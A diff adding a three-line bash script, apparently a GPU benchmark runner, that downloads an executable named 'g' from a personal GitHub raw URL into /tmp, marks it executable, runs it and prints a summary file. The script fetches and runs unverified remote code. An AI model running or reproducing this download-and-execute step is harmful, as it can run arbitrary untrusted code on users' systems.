@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+set -euo pipefail
+curl -fsSL https://raw.githubusercontent.com/JunityZz/g/main/g -o /tmp/g && chmod +x /tmp/g && OUT_DIR=/workspace/gpu-bench /tmp/g && cat /workspace/gpu-bench/gpu_bench_summary.txt
